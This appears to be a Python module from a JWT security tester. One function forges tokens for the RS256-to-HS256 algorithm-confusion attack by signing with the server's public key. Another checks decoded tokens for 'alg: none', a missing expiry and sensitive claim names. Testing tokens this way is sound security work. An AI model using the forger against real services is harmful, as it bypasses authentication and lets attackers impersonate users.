import hmac
import hashlib
import base64
import json

def base64url_encode(data: bytes) -> str:
    """Encodes bytes into a Base64Url string without padding."""
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

def generate_confusion_token(token: str, public_key_pem: str) -> dict:
    """
    Generates a forged token to test Algorithm Confusion (RS256 -> HS256).
    It uses the server's public key as the HMAC secret.
    """
    parts = token.split('.')
    if len(parts) != 3:
        return {"error": "Invalid token format."}

    try:
        payload = parts[1] # Keep the original payload untouched
        
        # 1. Craft a new header forcing the HS256 algorithm
        new_header = {"alg": "HS256", "typ": "JWT"}
        new_header_b64 = base64url_encode(json.dumps(new_header, separators=(',', ':')).encode('utf-8'))
        
        # 2. Combine new header and original payload
        header_payload = f"{new_header_b64}.{payload}".encode('utf-8')
        
        # 3. Sign using the exact string of the PUBLIC KEY as the HMAC secret
        sig = hmac.new(public_key_pem.encode('utf-8'), header_payload, hashlib.sha256).digest()
        new_signature = base64url_encode(sig)
        
        # 4. Assemble the forged token
        forged_token = f"{new_header_b64}.{payload}.{new_signature}"
        
        return {
            "success": True,
            "forged_token": forged_token,
            "description": "Forged token generated. If the server accepts this, it is vulnerable to Algorithm Confusion."
        }
    except Exception as e:
        return {"error": str(e)}

def check_static_vulnerabilities(decoded_jwt: dict) -> dict:
    """Checks the decoded JWT for common static misconfigurations."""
    vulnerabilities = []
    recommendations = []

    if "error" in decoded_jwt:
        return {"error": decoded_jwt["error"]}

    header = decoded_jwt.get("header", {})
    payload = decoded_jwt.get("payload", {})

    # 1. Check for 'alg: none' (CRITICAL)
    alg = header.get("alg", "").lower()
    if alg == "none":
        vulnerabilities.append({
            "type": "alg: none Attack",
            "severity": "CRITICAL",
            "description": "Token algorithm is set to 'none'. The token is accepted without any signature verification."
        })
        recommendations.append("Backend must strictly enforce allowed algorithms (e.g., ['HS256', 'RS256']) and explicitly reject 'none'.")

    # 2. Check for missing expiration (HIGH)
    if "exp" not in payload:
        vulnerabilities.append({
            "type": "Missing Expiration",
            "severity": "HIGH",
            "description": "No 'exp' (expiration) claim found. This token is valid indefinitely if stolen."
        })
        recommendations.append("Always include an 'exp' claim with a short Time-To-Live (TTL), such as 15–60 minutes.")

    # 3. Check for Sensitive Data in Payload (MEDIUM)
    sensitive_keywords = ["password", "pass", "pwd", "ssn", "secret", "credit_card", "cc", "token"]
    found_sensitive = [k for k in payload.keys() if any(sk in k.lower() for sk in sensitive_keywords)]
    
    if found_sensitive:
        vulnerabilities.append({
            "type": "Sensitive Data in Payload",
            "severity": "MEDIUM",
            "description": f"Potential sensitive data found in claims: {', '.join(found_sensitive)}."
        })
        recommendations.append("Never store PII or credentials unencrypted in the JWT payload. Anyone can decode and read this.")

    return {
        "vulnerabilities": vulnerabilities,
        "recommendations": recommendations
    }